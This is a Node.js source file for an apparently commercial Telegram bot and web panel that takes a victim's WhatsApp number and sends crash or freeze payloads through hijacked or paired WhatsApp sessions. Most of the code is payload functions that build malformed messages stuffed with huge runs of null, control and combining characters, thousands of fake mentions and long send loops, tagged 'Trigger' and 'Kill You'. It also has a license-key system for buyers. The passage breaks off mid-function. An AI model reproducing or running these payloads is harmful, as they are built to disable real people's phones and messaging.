const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const { InlineKeyboard } = require("grammy");
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  DisconnectReason,
  proto,
  prepareWAMessageMedia,
  generateWAMessageFromContent
} = require('@whiskeysockets/baileys');

const { tokens, owner: OwnerId, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const app = express();

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./sessions";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
let userApiBug = null;
let sock;

function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}


function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

/*function saveAkses(data) {
  const normalized = {
    owners: data.owners.map(id => id.toString()),
    akses: data.akses.map(id => id.toString())
  };
  fs.writeFileSync(file, JSON.stringify(normalized, null, 2));
}*/

function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id);
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
    console.log("✓ Data user berhasil disimpan.");
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    return [];
  }
}

function makeBox(title, lines) {
  const contentLengths = [
    title.length,
    ...lines.map(l => l.length)
  ];
  const maxLen = Math.max(...contentLengths);

  const top    = "╔" + "═".repeat(maxLen + 2) + "╗";
  const middle = "╠" + "═".repeat(maxLen + 2) + "╣";
  const bottom = "╚" + "═".repeat(maxLen + 2) + "╝";

  const padCenter = (text, width) => {
    const totalPad = width - text.length;
    const left = Math.floor(totalPad / 2);
    const right = totalPad - left;
    return " ".repeat(left) + text + " ".repeat(right);
  };

  const padRight = (text, width) => {
    return text + " ".repeat(width - text.length);
  };

  const titleLine = "║ " + padCenter(title, maxLen) + " ║";
  const contentLines = lines.map(l => "║ " + padRight(l, maxLen) + " ║");

  return `<blockquote>
${top}
${titleLine}
${middle}
${contentLines.join("\n")}
${bottom}
</blockquote>`;
}

const saveActive = (botNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(botNumber)) {
    list.push(botNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (botNumber) => {
  const dir = path.join(sessions_dir, `device${botNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(`Found ${activeNumbers.length} active WhatsApp sessions`);

  for (const botNumber of activeNumbers) {
    console.log(`Connecting WhatsApp: ${botNumber}`);
    const sessionDir = sessionPath(botNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: true,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${botNumber} connected!`);
          sessions.set(botNumber, sock);
          return resolve();
        }
        if (connection === "close") {
          const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          reconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (botNumber, chatId, ctx) => {
  const sessionDir = sessionPath(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`pairing with number *${botNumber}*...`, {
    parse_mode: "Markdown"
  });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, {
        parse_mode: "Markdown"
      });
    } catch (e) {
      console.error("Error:", e.message);
    }
  };

  let paired = false;

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "connecting") {
      if (!fs.existsSync(`${sessionDir}/creds.json`)) {
        setTimeout(async () => {
          try {
            const code = await sock.requestPairingCode(botNumber);
            const formatted = code.match(/.{1,4}/g)?.join("-") || code;
            await editStatus(makeCode(botNumber, formatted));
          } catch (err) {
            console.error("Error requesting code:", err);
            await editStatus(makeStatus(botNumber, `❗ ${err.message}`));
          }
        }, 3000);
      }
    }

    if (connection === "open" && !paired) {
      paired = true;
      sessions.set(botNumber, sock);
      saveActive(botNumber);
      await editStatus(makeStatus(botNumber, "✅ Connected successfully."));
    }

    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code !== DisconnectReason.loggedOut && code >= 500) {
        console.log("Reconnect diperlukan untuk", botNumber);
        setTimeout(() => connectToWhatsApp(botNumber, chatId, ctx), 2000);
      } else {
        await editStatus(makeStatus(botNumber, "❌ Failed to connect."));
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};

const makeStatus = (number, status) => 
  `*Status Pairing*\nNomor: \`${number}\`\nStatus: ${status}`;

const makeCode = (number, code) =>
  `*Kode Pairing*\nNomor: \`${number}\`\nKode: \`${code}\``;

bot.command("start", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Usuário";

  const teks = `
<b>[  ☇ 𝐒𝐡𝐚𝐝𝐨𝐰 𝐏𝐡𝐨𝐞𝐧𝐢𝐱 𝐕𝐯𝐢𝐩  ]</b>
╭─────────────────────────╸╴
│ Hᴏʟᴀᴀ ʙʀᴏᴏ : ${username}
│ Sᴄʀɪᴘᴛ : Shadow Phoenix
│ Dᴇᴠᴇʟᴏᴘᴇʀ : @DryzxModders
│ Dᴇᴠᴇʟᴏᴘᴇʀ : @MexxModders
│ Vᴇʀsɪᴏɴ : 1.0
│ Sᴛᴀᴛᴜs Sᴄʀɪᴘᴛ : Vᴠɪᴘ Bᴜʏ Oɴʟʏ
│ 
│ 
│ 「 Akses Menu 」
│ ᯓ /connect
│ ᯓ /listsender
│ ᯓ /delsender
│ ᯓ /ckey
│ ᯓ /listkey
│ ᯓ /delkey
│ 
│ 「 Owner Menu 」
│ ᯓ /addacces
│ ᯓ /delacces
│ ᯓ /addowner
│ ᯓ /delowner
╰─────────────────────────╸╴
`;

  const keyboard = new InlineKeyboard().url(
    "Group Pt",
    "https://t.me/allbuyersxpt"
  );

  await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/z7xdq5.png" },
    {
      caption: teks,
      parse_mode: "HTML",
      reply_markup: keyboard,
    }
  );
});

bot.command("connect", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("✗ Falha\n\nExample : /connect 628xxxx", { parse_mode: "HTML" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  const userId = ctx.from.id.toString();
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");

  const daftarSender = [...sessions.keys()]
    .map(n => `• ${n}`)
    .join("\n");

  ctx.reply(`Daftar Sender Aktif:\n${daftarSender}`);
});

bot.command("delsender", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }
  
  if (args.length < 2) return ctx.reply("✗ Falha\n\nExample : /delsender 628xxxx", { parse_mode: "HTML" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✓ Session untuk bot ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

bot.command("ckey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }

  if (!args || !args.includes(",")) {
    return ctx.reply("Example : /ckey X4thena,30d /ckey X4thena,30d,puki", { parse_mode: "HTML" });
  }

  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  const customKey = parts[2] ? parts[2].trim() : null;

  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  const key = customKey || generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  await ctx.reply(
    `✓ <b>Key berhasil dibuat:</b>\n\n` +
    `<b>Username:</b> <code>${username}</code>\n` +
    `<b>Key:</b> <code>${key}</code>\n` +
    `<b>Expired:</b> <i>${expiredStr}</i> WIB`,
    { parse_mode: "HTML" }
  );
});

bot.command("listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();

  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }

  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `𞅏 𝑨𝒄𝒕𝒊𝒗𝒆 𝑲𝒆𝒚 𝑳𝒊𝒔𝒕:\n\n`;

  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `${i + 1}. ${u.username}\nKey: ${u.key}\nExpired: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey X4thena");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});

bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }
  
  if (!id) return ctx.reply("✗ Falha\n\nExample : /addacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✓ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✓ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }
  
  if (!id) return ctx.reply("✗ Falha\n\nExample : /delacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("✗ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✓ Access to user ID ${id} removed.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!id) return ctx.reply("✗ Falha\n\nExample : /addowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✗ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✓ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }
  if (!id) return ctx.reply("✗ Falha\n\nExample : /delowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("✗ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner ID ${id} was successfully deleted.`);
});

bot.launch();
console.log(chalk.red(`
╭─⦏ 𝑿-𝑺𝒊𝒍𝒆𝒏𝒕 𝐆𝐞𝐫𝐚çã𝐨 𝟏 ⦐
│ꔹ ɪᴅ ᴏᴡɴ : ${OwnerId}
│ꔹ ᴅᴇᴠᴇʟᴏᴘᴇʀ : X4thena
│ꔹ ʙᴏᴛ : ᴄᴏɴᴇᴄᴛᴀᴅᴏ ✓
╰───────────────────`));

initializeWhatsAppConnections();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "X-SILENT", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "X-SILENT", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/execution");
});

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./X-SILENT/Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✓ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["andros", "ios"].includes(mode)) {
        return res.send(executionPage("✓ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("✗ Mode salah", {
        message: "Mode tidak dikenali."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("✗ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

    try {
      if (mode === "andros") {
        Delayinvisdrayy(target);
      } else if (mode === "ios") {
        Delayinvisdrayy(target);
      } else if (mode === "AndrosDelay") {
        Delayinvisdrayy(target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      return res.send(executionPage("✓ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, "", mode));
    } catch (err) {
      return res.send(executionPage("✗ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`✓ Server aktif di port ${PORT}`);
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

//═══════════//═════════⧼⧼FUNGSI DELAY INVIS⧽⧽═════════//═══════════//
async function DelayLocation(sock, target) {
  try {
    const msgContent1 = {
      viewOnceMessage: {
        message: {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!" + "\u202E".repeat(500) + "\uDBFF\uDFFF".repeat(1000),
                  hasMediaAttachment: false,
                  locationMessage: {
                    degreesLatitude: 992.999999,
                    degreesLongitude: -932.8889989,
                    name: "\u900A" + "\u0000".repeat(5000) + "\uFFFF".repeat(2000),
                    address: "\u0007".repeat(20000) + "꧔꧈".repeat(5000) + "\u2060".repeat(1000),
                  },
                },
                body: {
                  text: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!" + "\u0003".repeat(10000) + "꧔꧈".repeat(2000)
                },
                contextInfo: {
                  remoteJid: target,
                  participant: "0@s.whatsapp.net",
                  stanzaId: "1234567890ABCDEF",
                  forwardingScore: 99999,
                  isForwarded: true,
                  businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                  },
                  mentionedJid: [
                    target,
                    "1@s.whatsapp.net",
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1997 }, () =>
                      `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
                    )
                  ]
                }
              }
            }
          }
        }
      }
    };

    const Msg1 = generateWAMessageFromContent(target, msgContent1, { userJid: target });

    await sock.relayMessage("status@broadcast", Msg1.message, {
      messageId: Msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
    });

    const mentionedJids = Array.from({ length: 1600 }, () =>
      `${Math.floor(1e11 + Math.random() * 9e11)}@s.whatsapp.net`
    );

    let msgDelay;

    for (let i = 0; i < 999999; i++) {
      const msgContent2 = {
        viewOnceMessage: {
          message: {
            conversation: "\u2063".repeat(1000),
            contextInfo: {
              externalAdReply: {
                title: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!",
                body: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!",
                thumbnailUrl: "https://files.catbox.moe/daoc0z.jpg",
                mediaType: 1,
                sourceUrl: "https://t.me/LuciferNotDev",
                showAdAttribution: false
              },
              mentionedJid: mentionedJids
            },
            interactiveResponseMessage: {
              body: {
                text: "",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "꧔꧈".repeat(9000),
                version: 3
              }
            }
          }
        },
        nativeFlowMessage: {
          name: "call_permission_request",
          messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
          status: true,
          cameraAccess: true
        }
      };

      msgDelay = await generateWAMessageFromContent(target, msgContent2, {});
      await new Promise(resolve => setTimeout(resolve, 300));
    }

    await sock.relayMessage(target, msgDelay.message, {
      messageId: msgDelay.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
    });

    await sock.relayMessage("status@broadcast", msgDelay.message, {
      messageId: msgDelay.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
    });

  } catch (err) {
    console.error(err);
  }
}


//═══════════//═════════⧼⧼FUNGSI DELAY INVIS⧽⧽═════════//═══════════//
async function delayNew(sock, target, mention = true ) {
try {
    let sxo = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });
   let sXoMessage = {
     extendedTextMessage: {
       text: "ꦾ".repeat(300000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1900 },
                   () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         };

     const xso = generateWAMessageFromContent(target, sXoMessage, {});
      await sock.relayMessage("status@broadcast", xso.message, {
        messageId: xso.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
     if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: xso.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
    await sock.relayMessage("status@broadcast", sxo.message, {
        messageId: sxo.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: sxo.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
} catch (error) {
  console.error("Error di :", error, "Bodooo");
 }
}


//═══════════//═════════⧼⧼FUNGSI DELAY INVIS⧽⧽═════════//═══════════//
async function XangelDelay3(target, mention) {
  try {
    const buildContent = () => ({
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            nativeFlowResponseMessage: {
              version: 3,
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1045000)
            },
            body: {
              text: "#Xangel",
            }
          }
        }
      }
    })

    const buildOptions = () => ({
      isForwarded: false,
      ephemeralExpiration: 0,
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "0"),
      forwardingScore: 0,
      font: Math.floor(Math.random() * 9)
    })

    const buildMetaMentionNode = (target) => ({
      tag: "meta",
      attrs: {},
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { target }, content: undefined }]
        }
      ]
    })

    const msg = await generateWAMessageFromContent(
      target,
      buildContent(),
      buildOptions()
    )

    await sock.relayMessage("status@broadcast", msg.message, {
      additionalNodes: [buildMetaMentionNode(target)],
      statusJidList: [target],
      messageId: msg.key.id
    })

    if (mention) {
      let target = target.endsWith("@s.whatsapp.net")
      let content = "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!"
      await sock.sendMessage(
        target,
        {
          text: content,
          mentions: [target]
        }
      )
    }

  } catch (err) {
    console.error(err)
  }
}


//═══════════//═════════⧼⧼FUNGSI DELAY INVIS⧽⧽═════════//═══════════//
async function XStromDelayNative(target, mention) {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_message",
              paramsJson: "\x10".repeat(1000000),
              version: 2
            },
          },
        },
      },
    };
    
    const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "" },
            content: undefined
          }
        ]
      }
    );
  }
}


//═══════════//═════════⧼⧼FUNGSI DELAY INVIS⧽⧽═════════//═══════════//
async function Exios(sock, target, mention) {
const TravaIphone = "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!".repeat(60000); // Trigger1
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), // Trigger2
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), // Trigger 3
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, //Trigger 4
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!" + TravaIphone, //Trigger 5
            matchedText: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),//Trigger 6
            title: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!" + "𑇂𑆵𑆴𑆿".repeat(15000),//Trigger 7
            previewType: "NONE",
